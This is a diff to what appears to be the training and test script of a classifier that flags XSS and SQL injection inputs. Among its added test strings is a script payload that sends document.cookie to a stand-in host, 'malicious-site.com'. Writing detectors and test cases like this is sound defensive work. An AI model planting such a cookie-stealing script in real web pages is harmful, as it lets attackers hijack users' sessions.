@@ -32,9 +32,9 @@ EMBEDDING_DIM = 100
 HIDDEN_DIM = 32
 NUM_LAYERS = 1
 DROPOUT = 0.2
-N_EPOCHS = 2
+N_EPOCHS = 1
 # Ensure these paths are correct relative to where you run train.py
-DATA_PATH = 'csv_files/dt-v8.csv'
+DATA_PATH = 'csv_files/dt-v12.csv'
 WEIGHTS_PATH = 'saved_weights/best_model.pt' # Give the best weights a specific name
 MODELS_DIR = "saved_models"
 WEIGHTS_DIR = "saved_weights"
@@ -503,8 +503,9 @@ if __name__ == "__main__":
         predict(model, 'alert(1) </script>', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
         predict(model, 'select * from users where id=1;', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='sql')
         predict(model, 'this is a safe text', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='safe')
-        predict(model,"<h1>Hello World</h1>", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='safe') # HTML might be safe or XSS depending on context/definition
+        predict(model,"<h1>Hello World</h1>", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss') # HTML might be safe or XSS depending on context/definition
         predict(model,"<script> this is a safe text dont worry", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
+        predict(model,"<script>fetch('http://malicious-site.com/steal?cookie=' + document.cookie)</script>", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
         predict(model,"make sure you select from from the groups where they are equal to eachother", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='safe') # Assuming this isn't a malicious SQL query
 
     else:
